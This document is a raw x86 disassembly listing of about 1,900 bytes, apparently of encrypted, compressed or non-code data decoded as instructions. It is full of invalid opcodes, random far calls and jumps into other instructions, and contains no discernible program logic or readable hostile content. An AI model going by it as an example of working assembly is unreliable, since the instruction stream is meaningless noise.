  4401bf:	(bad)  
  4401c0:	lahf   
  4401c1:	(bad)  
  4401c2:	mov    edx,0xd310b29c
  4401c7:	jg     0x440166
  4401c9:	sbb    DWORD PTR [eax],0xc90bda58
  4401cf:	pop    esp
  4401d0:	aas    
  4401d1:	cmp    BYTE PTR [ebx-0x1c],0xae
  4401d5:	pop    ecx
  4401d6:	fs sbb eax,0x419a8758
  4401dc:	push   edi
  4401dd:	sbb    esi,esi
  4401df:	pop    edx
  4401e0:	shl    dl,1
  4401e2:	iret   
  4401e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4401e4:	pushf  
  4401e5:	lock xchg ecx,eax
  4401e7:	jecxz  0x4401d5
  4401e9:	push   ss
  4401ea:	aad    0x61
  4401ec:	mov    dl,0xb8
  4401ee:	pop    ecx
  4401ef:	mov    ah,0xde
  4401f1:	inc    edx
  4401f2:	in     eax,dx
  4401f3:	mov    ecx,0xdae00b34
  4401f8:	fwait
  4401f9:	mov    al,0x49
  4401fb:	sbb    esp,ebp
  4401fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4401fe:	in     al,dx
  4401ff:	scas   al,BYTE PTR es:[edi]
  440200:	mov    bh,0xdb
  440202:	xor    DWORD PTR [esi],0xc94ff6e
  440208:	int3   
  440209:	(bad)  
  44020a:	(bad)  
  44020c:	adc    edi,esi
  44020e:	push   ebx
  44020f:	imul   DWORD PTR [ebx+ecx*1-0x6279ee98]
  440216:	pop    ss
  440217:	cmp    esp,DWORD PTR [esi+edi*8-0x65]
  44021b:	mov    eax,ds:0x54db2a88
  440220:	add    DWORD PTR [edi+0xbfcdc46],eax
  440226:	dec    ecx
  440227:	js     0x4401c1
  440229:	out    0x8e,eax
  44022b:	adc    ch,bh
  44022d:	pop    esp
  44022e:	push   0x9a4ac7d8
  440233:	and    bl,BYTE PTR [esi]
  440235:	stc    
  440236:	add    DWORD PTR [ebp+0x61],0x70a79fc6
  44023d:	sub    ebx,DWORD PTR [ecx+0xfed184d]
  440243:	bound  ecx,QWORD PTR [edi-0x5e5e7824]
  440249:	retf   
  44024a:	nop
  44024b:	jmp    0x4401fb
  44024d:	jne    0x4402b8
  44024f:	pop    ds
  440250:	enter  0xce0e,0xe7
  440254:	out    0x74,eax
  440256:	dec    esp
  440257:	daa    
  440258:	adc    eax,0xbbd1e68e
  44025d:	mov    edx,0x8bc25374
  440262:	mov    WORD PTR [esi+0x6767aa36],?
  440268:	mov    WORD PTR [edx],?
  44026a:	jns    0x44023c
  44026c:	retf   0x9b61
  44026f:	stos   DWORD PTR es:[edi],eax
  440270:	pop    ebp
  440271:	xor    al,0xca
  440273:	cmp    eax,0x94424734
  440278:	jae    0x440285
  44027a:	test   BYTE PTR [esi-0x40],cl
  44027d:	xchg   edx,eax
  44027e:	sbb    BYTE PTR [ecx-0x6a],0xa4
  440282:	call   0x94db:0x4c532f11
  440289:	jl     0x4402e5
  44028b:	mov    edx,0x27d7ec0c
  440290:	inc    ebx
  440291:	into   
  440292:	sbb    edi,esp
  440294:	jae    0x4402d6
  440296:	call   0x30a1:0xe5b9dd59
  44029d:	bound  edi,QWORD PTR ds:0xda8b5489
  4402a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4402a4:	mov    ebx,es
  4402a6:	retf   
  4402a7:	test   DWORD PTR [edi+0x59],ebx
  4402aa:	call   0xc4e8:0xa9714a1a
  4402b1:	fadd   DWORD PTR [ebx]
  4402b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4402b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4402b5:	adc    DWORD PTR [edx-0x7],ecx
  4402b8:	pop    esi
  4402b9:	stos   BYTE PTR es:[edi],al
  4402ba:	out    0x67,eax
  4402bc:	cmp    al,0x1c
  4402be:	ss push ebp
  4402c0:	call   0x790d:0xf36c1504
  4402c7:	aad    0x34
  4402c9:	leave  
  4402ca:	jp     0x440257
  4402cc:	or     ebp,DWORD PTR [ebx-0x6c]
  4402cf:	jl     0x440272
  4402d1:	mov    edi,ebx
  4402d3:	xor    eax,0x5530d2b2
  4402d8:	je     0x440321
  4402da:	mov    ecx,0x3a174aa3
  4402df:	sbb    bh,dh
  4402e1:	mov    ds:0xfceea7aa,eax
  4402e6:	addr16 mov ecx,0xa70896d6
  4402ec:	(bad)  [ecx]
  4402ee:	sbb    BYTE PTR [ecx-0x7b],bl
  4402f1:	and    DWORD PTR [ebx+0x2c1bb282],ebp
  4402f7:	pop    ebp
  4402f8:	cmp    eax,0x7b16ccbb
  4402fd:	sbb    al,0x48
  4402ff:	add    esp,DWORD PTR [edi+0xb]
  440302:	mov    ebp,0x85f9fe23
  440307:	stos   BYTE PTR es:[edi],al
  440308:	ret    0x991f
  44030b:	add    DWORD PTR [esi+ebp*4+0x75],esp
  44030f:	dec    esi
  440310:	dec    ebx
  440312:	ins    BYTE PTR es:[edi],dx
  440313:	aaa    
  440314:	jmp    0x440321
  440316:	test   al,0x52
  440318:	stos   DWORD PTR es:[edi],eax
  440319:	and    esp,ebx
  44031b:	icebp  
  44031c:	push   0xc
  44031e:	pusha  
  44031f:	adc    dh,BYTE PTR [edx+0x7cb1fa1e]
  440325:	in     al,0x95
  440327:	cmp    DWORD PTR [edx],ebp
  440329:	or     BYTE PTR [ecx+eiz*1],dl
  44032c:	fsubr  QWORD PTR [ebp-0x14ea1486]
  440332:	sub    ah,bl
  440334:	(bad)  
  440335:	bound  edi,QWORD PTR [eax+0x4e]
  440338:	mov    dl,0x88
  44033a:	jle    0x4402d4
  44033c:	aam    0x55
  44033e:	fs (bad) 
  440340:	lahf   
  440341:	or     edx,DWORD PTR [edx+eax*8]
  440344:	out    dx,al
  440345:	imul   DWORD PTR [ebx-0x64f72c8a]
  44034b:	sbb    eax,0xbaec65f9
  440350:	das    
  440351:	sbb    cl,BYTE PTR [edx+0x2f]
  440354:	sbb    DWORD PTR [ebx],ecx
  440356:	push   esp
  440357:	out    0x74,al
  440359:	or     al,0xe4
  44035b:	fnstsw WORD PTR [ebx-0x70]
  44035e:	call   0xf536:0xba12d118
  440365:	ror    ah,1
  440367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440368:	pop    ebx
  440369:	mov    dh,0x94
  44036b:	pop    esi
  44036c:	push   si
  44036e:	push   edx
  44036f:	dec    ecx
  440370:	mov    al,ds:0x4db39d41
  440375:	cmp    eax,0x1e52f658
  44037a:	into   
  44037b:	iret   
  44037c:	fiadd  WORD PTR [ebx+eiz*4]
  44037f:	jb     0x4403f8
  440381:	pushf  
  440382:	lea    esp,[edi-0x7032f3c7]
  440388:	scas   eax,DWORD PTR es:[edi]
  440389:	pusha  
  44038a:	sahf   
  44038b:	(bad)  
  44038c:	icebp  
  44038d:	push   esi
  44038e:	retf   0x7215
  440391:	cmp    eax,0xe5261677
  440396:	retf   
  440397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440398:	pop    ebx
  440399:	push   ecx
  44039a:	cli    
  44039b:	call   0xcb0bbbe7
  4403a0:	mov    dl,0x86
  4403a2:	dec    edx
  4403a3:	cmp    ecx,DWORD PTR [edx]
  4403a5:	out    dx,al
  4403a6:	pop    ebp
  4403a7:	xchg   esi,eax
  4403a8:	sub    ecx,DWORD PTR [ebx]
  4403aa:	js     0x440375
  4403ac:	mov    DWORD PTR [esi+0x23],edi
  4403af:	inc    edi
  4403b0:	adc    ah,BYTE PTR [edx+ebx*4-0x56]
  4403b4:	into   
  4403b5:	mov    edx,0xf28a8066
  4403ba:	push   edx
  4403bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4403bc:	popa   
  4403bd:	loope  0x4403a1
  4403bf:	or     ebx,DWORD PTR [ebp+0x5c]
  4403c2:	loope  0x44042c
  4403c4:	mov    dl,0x37
  4403c6:	and    ebx,edx
  4403c8:	lahf   
  4403c9:	mov    eax,ds:0xe1419adb
  4403ce:	add    eax,0xf83ebea7
  4403d3:	(bad)  [ebx-0x4d97b716]
  4403d9:	scas   eax,DWORD PTR es:[edi]
  4403da:	adc    ebx,DWORD PTR [edi]
  4403dc:	jg     0x440366
  4403de:	push   0x9
  4403e0:	add    DWORD PTR [ebx],ecx
  4403e2:	adc    eax,0x9c66a504
  4403e7:	lea    edx,[ecx-0x17e76512]
  4403ed:	add    eax,0x9a2fc820
  4403f2:	xcrypt-cfb (bad)
  4403f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4403f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4403f5:	jns    0x4403b1
  4403f7:	add    ah,BYTE PTR [esp+eax*4]
  4403fa:	rcl    DWORD PTR [ecx-0xd3b114d],cl
  440400:	and    cl,al
  440402:	push   es
  440403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440404:	dec    esi
  440405:	fimul  DWORD PTR [esi-0x5a]
  440408:	inc    esi
  440409:	sub    BYTE PTR [edx],dh
  44040b:	mov    eax,0x6805b510
  440410:	add    DWORD PTR [edx+ebp*1+0x10],edi
  440414:	xchg   DWORD PTR [ebx+ebx*4],esi
  440417:	cmp    DWORD PTR [ebx+ebp*1+0x2da86c7c],ecx
  44041e:	cli    
  44041f:	shl    DWORD PTR ds:0xd6a7a1bb,0x1e
  440426:	in     eax,dx
  440427:	push   eax
  440428:	les    esp,FWORD PTR [esi+0x61af93d1]
  44042e:	pop    edx
  44042f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440430:	xor    dl,BYTE PTR [ecx-0xc]
  440433:	sub    DWORD PTR [esi],esp
  440435:	shr    BYTE PTR [edi],cl
  440437:	pop    ds
  440438:	mov    ebp,0xee1a510b
  44043d:	push   ss
  44043e:	out    dx,eax
  44043f:	push   esp
  440440:	pop    ss
  440441:	cs cdq 
  440443:	lods   al,BYTE PTR ds:[esi]
  440444:	mov    BYTE PTR [ecx],dl
  440446:	fidiv  WORD PTR [ebx]
  440448:	sub    cl,BYTE PTR [ebx+0x731a206a]
  44044e:	lods   al,BYTE PTR ds:[esi]
  44044f:	push   ebx
  440450:	push   ecx
  440451:	test   DWORD PTR [ebx-0x59],0x6ce4f84a
  440458:	hlt    
  440459:	fs int 0xa9
  44045c:	mov    dl,0x81
  44045e:	shr    DWORD PTR ss:[edi+0x55af89c5],0xb
  440466:	add    bh,BYTE PTR [ecx+0x26]
  440469:	lock loopne 0x4404a5
  44046c:	inc    ebx
  44046d:	xchg   esi,eax
  44046e:	call   0x7686:0x55ddfc64
  440475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440476:	out    0x9d,eax
  440478:	mov    BYTE PTR [eax+0x1a],ah
  44047b:	inc    edx
  44047c:	rcr    DWORD PTR [ecx],0x61
  44047f:	sti    
  440480:	dec    edx
  440481:	adc    eax,0x6ee1739a
  440486:	and    BYTE PTR [ebx],ch
  440488:	ret    0x383d
  44048b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44048c:	dec    ebp
  44048d:	cmp    ecx,ebp
  44048f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440490:	jmp    0x440497
  440492:	ins    BYTE PTR es:[edi],dx
  440493:	pop    esi
  440494:	dec    edx
  440495:	sbb    eax,0x4976db9a
  44049a:	imul   ebp,DWORD PTR [esi-0x58c11d07],0x45366fb8
  4404a4:	xor    dh,BYTE PTR [esp+esi*8+0xe11b2c1]
  4404ab:	push   es
  4404ac:	adc    cl,al
  4404ae:	pop    ds
  4404af:	inc    ebx
  4404b0:	in     eax,dx
  4404b1:	or     ecx,DWORD PTR [ecx]
  4404b3:	xor    dl,BYTE PTR [edi+0x36814847]
  4404b9:	or     cl,ah
  4404bb:	mov    BYTE PTR [edx-0x7621f567],dh
  4404c1:	and    eax,0xb990d3f
  4404c6:	sbb    eax,0x3e65020a
  4404cb:	jno    0x4404e2
  4404cd:	aas    
  4404ce:	jb     0x44045b
  4404d0:	int    0x84
  4404d2:	call   0xd17f:0xf3babc41
  4404d9:	push   esi
  4404da:	rcr    esi,cl
  4404dc:	ror    DWORD PTR [ebx],0xdc
  4404df:	iret   
  4404e0:	mov    al,ds:0xe9878927
  4404e5:	adc    eax,0x5ae8c99a
  4404ea:	ins    BYTE PTR es:[edi],dx
  4404eb:	push   esi
  4404ec:	sar    DWORD PTR [eax],cl
  4404ee:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4404f0:	fbstp  TBYTE PTR [ebp+0x4a]
  4404f3:	push   ebx
  4404f4:	mov    ah,0x83
  4404f6:	xchg   ecx,eax
  4404f7:	fdiv   QWORD PTR [esi+0x1c7b6a29]
  4404fd:	call   0xb2e:0x8bb24926
  440504:	scas   eax,DWORD PTR es:[edi]
  440505:	mov    bh,0xb5
  440507:	mov    al,ds:0x115218b2
  44050c:	call   0x800:0xb1a542d8
  440513:	fidiv  DWORD PTR [edi-0x31]
  440516:	call   0xc3ba:0x7a4b41cc
  44051d:	mov    bl,0x9d
  44051f:	add    eax,0x8867d2c5
  440524:	adc    bl,BYTE PTR [ebp+0x5becb57e]
  44052a:	xchg   edx,eax
  44052b:	jb     0x440593
  44052d:	or     esi,DWORD PTR [ebp+edi*4-0x2d]
  440531:	nop
  440532:	retf   
  440533:	inc    edi
  440534:	(bad)  
  440535:	dec    ebx
  440536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440537:	sub    al,0xcb
  440539:	or     dh,BYTE PTR [ebx+0x603e283]
  44053f:	dec    esi
  440540:	pop    edi
  440541:	mov    ebx,0x7083c35e
  440546:	adc    esp,DWORD PTR [eax+eax*2+0x184c2f44]
  44054d:	into   
  44054e:	jnp    0x440573
  440550:	mov    ds:0xb0c0753b,eax
  440555:	fiadd  WORD PTR [ecx]
  440557:	adc    eax,0xe46854e1
  44055c:	icebp  
  44055d:	mov    bl,0xfb
  44055f:	sbb    bh,bh
  440561:	or     edi,DWORD PTR [edx-0x1145d72]
  440567:	push   ds
  440568:	pop    ebx
  440569:	das    
  44056a:	call   0x953c:0x914d0e38
  440571:	sub    dl,BYTE PTR [ecx-0x61]
  440574:	aam    0x29
  440576:	call   0xcad7:0xb3a7a865
  44057d:	lds    edx,FWORD PTR [eax+0x681dec89]
  440583:	addr16 mov dl,0xfc
  440586:	or     edi,edx
  440588:	pop    ecx
  440589:	mov    edx,ds
  44058b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44058c:	loop   0x4405ed
  44058e:	add    esp,DWORD PTR [ebx]
  440590:	lods   al,BYTE PTR ds:[si]
  440592:	mov    DWORD PTR [eax-0x43],ebp
  440595:	test   al,0xa9
  440597:	inc    edi
  440598:	fmulp  st(2),st
  44059a:	imul   ecx,DWORD PTR [esi-0x699d9750],0x2b910c6d
  4405a4:	pop    esi
  4405a5:	jae    0x440549
  4405a7:	out    0xf3,eax
  4405a9:	xchg   ax,ax
  4405ab:	sub    cl,BYTE PTR [ebx+0x7723be67]
  4405b1:	push   0x3d
  4405b3:	fs jb  0x440594
  4405b6:	xchg   ecx,eax
  4405b7:	(bad)  
  4405b8:	pop    ecx
  4405b9:	mov    bl,0xf
  4405bb:	cmp    cl,dl
  4405bd:	pop    ebx
  4405be:	jp     0x44056a
  4405c0:	mov    dl,0xed
  4405c2:	out    dx,eax
  4405c3:	lods   eax,DWORD PTR cs:[esi]
  4405c5:	rcr    DWORD PTR [ebx+0x15],0xa2
  4405c9:	or     BYTE PTR [ecx],bh
  4405cb:	(bad)
  4405cf:	cmp    DWORD PTR [edx+0x49],edi
  4405d2:	xchg   edx,eax
  4405d3:	sub    eax,0x3fcf44b2
  4405d8:	dec    edi
  4405d9:	mov    esi,0xb4841f8
  4405de:	cmp    edx,DWORD PTR [ecx+0x40fc48c4]
  4405e4:	xor    ch,bh
  4405e6:	xchg   esp,eax
  4405e7:	push   eax
  4405e8:	sahf   
  4405e9:	mov    bl,0x0
  4405eb:	pusha  
  4405ec:	jnp    0x440609
  4405ee:	cli    
  4405ef:	or     al,0x24
  4405f1:	dec    edi
  4405f2:	sahf   
  4405f3:	pop    ecx
  4405f4:	gs or  esp,esi
  4405f7:	gs lahf 
  4405f9:	jno    0x440659
  4405fb:	out    dx,al
  4405fc:	or     edi,DWORD PTR [eax+0x6e]
  4405ff:	cwde   
  440600:	mov    bh,0xbf
  440602:	dec    edi
  440603:	or     DWORD PTR [ebx+edi*4],esp
  440606:	pop    edx
  440607:	frndint 
  440609:	int3   
  44060a:	fnstcw WORD PTR [edx-0x6146cad7]
  440610:	jp     0x4405a4
  440612:	call   0xaaf6:0xc47f568a
  440619:	icebp  
  44061a:	call   0xcef2:0x5c9c4ff1
  440621:	mov    BYTE PTR [edx],dl
  440623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440624:	inc    esi
  440625:	dec    esp
  440626:	fstp   DWORD PTR [edi+0x739c4486]
  44062c:	repz pusha 
  44062e:	xchg   BYTE PTR [eax],bl
  440630:	and    ah,BYTE PTR [ebp-0x5cbcdd66]
  440636:	aam    0xfc
  440638:	ror    BYTE PTR [ebx],0xdf
  44063b:	rol    bh,0xd
  44063e:	dec    edi
  44063f:	je     0x440653
  440641:	shl    DWORD PTR [esi+0x48],cl
  440644:	in     eax,dx
  440645:	xor    DWORD PTR [edx],0x1a748aec
  44064b:	test   eax,0xf948c363
  440650:	jne    0x4406c1
  440652:	call   0x62e5:0x622b2112
  440659:	daa    
  44065a:	sahf   
  44065b:	mov    ds:0xdc0765fd,eax
  440660:	clc    
  440661:	loope  0x4406c0
  440663:	popa   
  440664:	shr    DWORD PTR [edx+eax*2],cl
  440667:	push   0x1b4e976f
  44066c:	push   ds
  44066d:	inc    edi
  44066e:	mov    cl,0x3c
  440670:	mov    dl,0xf7
  440672:	retf   0xd192
  440675:	sahf   
  440676:	jle    0x44066c
  440678:	mov    bl,0x7c
  44067a:	fcomp  QWORD PTR [eax+ebp*1+0x7edcb46c]
  440681:	shl    BYTE PTR [eax-0x2a],0xb5
  440685:	or     dl,BYTE PTR [ecx]
  440687:	lock mov eax,ds:0xb3fb24c5
  44068d:	(bad)  
  44068f:	test   al,0xb2
  440691:	ret    
  440692:	inc    ebx
  440693:	mov    ebp,0x9f7c8ddd
  440698:	clc    
  440699:	jns    0x4406c0
  44069b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44069c:	add    BYTE PTR [ebx-0xa5189cd],0x38
  4406a3:	sbb    eax,0x561879b2
  4406a8:	ficomp DWORD PTR [esi+0xb8167af]
  4406ae:	ds mov bl,0x13
  4406b1:	and    DWORD PTR [edx],ebp
  4406b3:	(bad)
  4406b7:	(bad)  
  4406b9:	jnp    0x44066b
  4406bb:	call   0xbd2:0x1d0c46f9
  4406c2:	push   ds
  4406c3:	out    0x57,eax
  4406c5:	mov    edi,0x52b243bb
  4406ca:	popa   
  4406cb:	lahf   
  4406cc:	out    0xe6,al
  4406ce:	mov    edx,DWORD PTR [ecx-0x70]
  4406d1:	loope  0x440690
  4406d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4406d4:	shl    DWORD PTR [ebx+edx*1-0x72b7f30e],0x0
  4406dc:	(bad)  
  4406dd:	je     0x4406c6
  4406df:	daa    
  4406e0:	sub    dl,dl
  4406e2:	xchg   dh,bh
  4406e4:	fst    QWORD PTR ds:0x4d14a94b
  4406ea:	out    dx,al
  4406eb:	jmp    0x44068a
  4406ed:	sbb    al,0xb9
  4406ef:	or     ebx,DWORD PTR [esi-0x78]
  4406f2:	and    dh,al
  4406f4:	fadd   QWORD PTR [ecx-0x7411e36f]
  4406fa:	dec    eax
  4406fb:	daa    
  4406fc:	sub    al,0x4e
  4406fe:	dec    ebp
  4406ff:	push   esp
  440700:	push   es
  440701:	or     edx,DWORD PTR [eax+0x4f]
  440704:	jl     0x440703
  440706:	jmp    0x1e92:0x9aeff477
  44070d:	mov    cl,0x93
  44070f:	sub    dl,ch
  440711:	add    al,0x73
  440713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440714:	test   al,0x3d
  440716:	sar    DWORD PTR [eax],cl
  440718:	pop    eax
  440719:	pop    esi
  44071a:	dec    ebp
  44071b:	loopne 0x4406cf
  44071d:	retf   0x8b9
  440720:	les    ebp,FWORD PTR ds:0xb5ed65a
  440726:	into   
  440727:	xchg   DWORD PTR [edi+0x7696e49a],esi
  44072d:	and    al,BYTE PTR [ebp-0x65f375dd]
  440733:	aam    0x3e
  440735:	fsub   DWORD PTR ds:0x1331d635
  44073b:	push   ecx
  44073c:	mov    dl,0xb0
  44073e:	sbb    ch,BYTE PTR [ecx-0x61]
  440741:	mov    ebp,0x4372f0f8
  440746:	inc    eax
  440747:	dec    eax
  440748:	mov    cl,0x4c
  44074a:	pop    ss
  44074b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44074c:	mov    ah,0xa3
  44074e:	add    eax,0x3af137a9
  440753:	push   esp
  440754:	icebp  
  440755:	inc    ebx
  440756:	call   0x33a8:0xa1d2ae78
  44075d:	stos   DWORD PTR es:[edi],eax
  44075e:	mov    bl,0xa7
  440760:	in     eax,dx
  440761:	xchg   ebp,eax
  440762:	inc    ecx
  440763:	sbb    esi,DWORD PTR [ecx+eiz*4+0x4c]
  440767:	mov    al,0xad
  440769:	xchg   ecx,eax
  44076a:	jae    0x440740
  44076c:	jb     0x440720
  44076e:	pop    ss
  44076f:	or     al,0xc6
  440771:	pop    es
  440772:	pop    ds
  440773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440774:	(bad)  
  440775:	lods   eax,DWORD PTR ds:[esi]
  440776:	sbb    BYTE PTR [ebp+0x326d45d1],dl
  44077c:	mov    dl,0x1e
  44077e:	fwait
  44077f:	jbe    0x440789
  440781:	xor    esp,DWORD PTR [ebp-0x39]
  440784:	add    ah,ah
  440786:	stos   DWORD PTR es:[edi],eax
  440787:	add    esi,edx
  440789:	push   es
  44078a:	adc    esi,edx
  44078c:	(bad)  
  44078d:	push   ss
  44078e:	xchg   esp,eax
  44078f:	push   ebp
  440790:	and    DWORD PTR [ebx-0x30],ecx
  440793:	ds (bad) 
  440795:	mov    eax,ds:0xc6af6540
  44079a:	loopne 0x440769
  44079c:	repnz (bad) 
  44079f:	das    
  4407a0:	addr16 mov esp,0x43c7a781
  4407a6:	test   eax,0xa8735268
  4407ab:	xchg   ebx,eax
  4407ac:	mov    dl,0x8f
  4407ae:	adc    BYTE PTR [edx-0x641f4234],0x60
  4407b5:	xor    bl,cl
  4407b7:	fmul   QWORD PTR [esi]
  4407b9:	sbb    bl,BYTE PTR [edx-0x720df86f]
  4407bf:	or     eax,0xba992d24
  4407c4:	shr    bl,0x51
  4407c7:	jmp    0x178a:0x546bbba1
  4407ce:	pushf  
  4407cf:	jmp    0x4407c9
  4407d1:	dec    ebx
  4407d2:	imul   BYTE PTR [edi]
  4407d4:	jge    0x440779
  4407d6:	stos   BYTE PTR es:[edi],al
  4407d7:	fdiv   DWORD PTR [edx-0x1fd150b4]
  4407dd:	(bad)  
  4407df:	ss in  al,dx
  4407e1:	or     ebp,DWORD PTR [esi-0x32]
  4407e4:	mov    esp,0x30313d21
  4407e9:	xchg   ebp,eax
  4407ea:	jecxz  0x440835
  4407ec:	lods   eax,DWORD PTR ds:[esi]
  4407ed:	mov    eax,0x40728866
  4407f2:	add    BYTE PTR [eax-0x586f66ef],bh
  4407f8:	sar    BYTE PTR [ebp+0x11e393cc],1
  4407fe:	dec    esp
  4407ff:	adc    al,0xbd
  440801:	shl    BYTE PTR [edx-0x5b],cl
  440804:	out    0xe4,al
  440806:	jecxz  0x4407ef
  440808:	pop    ds
  440809:	test   eax,0xce1a6dd
  44080e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44080f:	les    esp,FWORD PTR [esi-0x4ad6485c]
  440815:	add    ebx,esi
  440817:	(bad)  
  440818:	sub    ax,0x76a9
  44081c:	mov    ch,0x3a
  44081e:	sbb    al,dl
  440820:	adc    BYTE PTR [ebx],bl
  440822:	cmp    al,cl
  440824:	inc    eax
  440825:	pop    edi
  440826:	je     0x4407cf
  440828:	data16 add BYTE PTR gs:[edi],cl
  44082c:	mov    ebx,0xb29b4281
  440831:	xlat   BYTE PTR ds:[ebx]
  440832:	out    dx,eax
  440833:	mov    cl,0x20
  440835:	adc    DWORD PTR [ebp+0xe0b2c71],ebx
  44083b:	mov    bh,0xe3
  44083d:	mov    ebp,0xe64ab54b
  440842:	cwde   
  440843:	mov    ds:0x95aa43e4,al
  440848:	pmuludq mm3,QWORD PTR [edx]
  44084b:	jl     0x4408b5
  44084d:	imul   esp,DWORD PTR [ecx],0xffffffa0
  440850:	mov    dl,0xd6
  440852:	in     eax,dx
  440853:	dec    ebx
  440854:	clc    
  440855:	(bad)  
  440856:	(bad)  
  440858:	fmul   DWORD PTR [ebx]
  44085a:	mov    cl,0xe7
  44085c:	cwde   
  44085d:	das    
  44085e:	lahf   
  44085f:	hlt    
  440860:	and    ebx,DWORD PTR es:[ebx-0x3276fa41]
  440867:	inc    eax
  440868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440869:	dec    esp
  44086a:	data16 aam 0xba
  44086d:	pop    es
  44086e:	mov    gs,esi
  440870:	lods   eax,DWORD PTR ds:[esi]
  440871:	mov    dh,0xb0
  440873:	mov    bh,0x8f
  440875:	loop   0x44081a
  440877:	test   eax,0x67d874f3
  44087c:	pop    ss
  44087d:	push   ebp
  44087e:	fdivr  QWORD PTR [ecx-0x7a]
  440881:	or     ebp,DWORD PTR [ebx-0x29ab4b39]
  440887:	mov    ds,esp
  440889:	mov    ds:0x67c61d9a,eax
  44088e:	jno    0x44085a
  440890:	fcomp  DWORD PTR [esi+0x3a]
  440893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440894:	or     esi,esi
  440896:	dec    esi
  440897:	es ja  0x44085e
  44089a:	xchg   esp,eax
  44089b:	mov    ebp,0xb03d02b2
  4408a0:	aad    0xe8
  4408a2:	add    ebx,ecx
  4408a4:	pop    ebp
  4408a5:	add    al,0x9b
  4408a7:	mov    esi,0xe06445f9
  4408ac:	or     BYTE PTR [edi-0x5c],dh
  4408af:	addr16 cdq 
  4408b1:	jl     0x440930
  4408b3:	xor    eax,0xed74ffb2
  4408b8:	addr16 and al,0xe7
  4408bb:	mov    ecx,0x925f15b6
  4408c0:	pop    esi
  4408c1:	xor    al,0x1a
  4408c3:	and    ah,BYTE PTR ds:0x9cd46aab
  4408c9:	cmp    al,0x9a
  4408cb:	adc    al,0xc8
  4408cd:	retf   0x995
  4408d0:	cmp    BYTE PTR [ebp+0x22],bl
  4408d3:	ror    DWORD PTR [edi+0x20c5e80b],1
  4408d9:	xchg   ebp,eax
  4408da:	dec    eax
  4408db:	dec    eax
  4408dc:	sbb    dh,bh
  4408de:	call   0x57fb:0xbdc12447
  4408e5:	sbb    bl,cl
  4408e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4408e8:	pop    ss
  4408e9:	popa   
  4408ea:	mov    ch,BYTE PTR [edx+0x62463b9f]
  4408f0:	sti    
  4408f1:	repz sbb BYTE PTR [ecx-0x44],ch
  4408f5:	xchg   ecx,eax
  4408f6:	push   ebp
  4408f7:	or     DWORD PTR [esi+0x705f50cb],esp
  4408fd:	xor    edx,esp
  4408ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440900:	mov    ss,ebx
  440902:	inc    esi
  440903:	cmp    esp,DWORD PTR [edi-0x4d498411]
  440909:	push   edx
  44090a:	je     0x440962
  44090c:	jg     0x4408f7
  44090e:	mov    al,0xdf
  440910:	and    BYTE PTR [ebx],cl
  440912:	test   BYTE PTR [ecx],cl
  440914:	in     al,dx
  440915:	ins    DWORD PTR es:[edi],dx
  440916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440917:	into   
  440918:	jne    0x44090a
  44091a:	call   0xb883:0xc6a97832
  440921:	mov    eax,0x2e8a9d4
  440926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440927:	xchg   ebp,eax
  440928:	repnz cld 
  44092a:	mov    al,ds:0x9a4ded49
  44092f:	add    eax,0xb60f6ef2
  440934:	mov    edi,DWORD PTR [esi-0x4db858d3]
  44093a:	adc    al,0x13
  44093c:	scas   eax,DWORD PTR es:[edi]
  44093d:	repnz mov esp,0x16a5b2bd
  440943:	cmp    edx,DWORD PTR [eax-0x6]
  440946:	add    eax,0xc3fd9289
  44094b:	aas    
  44094c:	adc    ecx,esi
  44094e:	cdq    
  44094f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440950:	ss dec ecx
  440952:	pop    ss
  440953:	ja     0x4408d9
  440955:	xor    al,0xc5
  440957:	shl    BYTE PTR [edx-0x3911076],1
  44095d:	retf   
  44095e:	addr16 icebp 
  440960:	cmp    BYTE PTR [edi],ch
  440962:	sub    DWORD PTR [edx],eax
  440964:	retf   0xda0c
  440967:	out    dx,eax
  440968:	loope  0x440985
  44096a:	pop    esp
  44096b:	pop    esp
  44096c:	fisubr WORD PTR [eax]
  44096e:	call   0x1f9f:0xb8a0c5d9
  440975:	xchg   ch,bh
  440977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440978:	test   DWORD PTR [edi],edx
  44097a:	into   
  44097b:	ja     0x4409fb
  44097d:	pusha  
  44097e:	clc    
  44097f:	jae    0x440985
  440981:	push   0xffffff9a
  440983:	scas   al,BYTE PTR es:[edi]
  440984:	add    eax,ebx
  440986:	adc    esi,ecx
  440988:	in     eax,0xf4
  44098a:	cmp    DWORD PTR [edi],ebx
  44098c:	por    mm6,QWORD PTR [eax+0x3b441ea7]
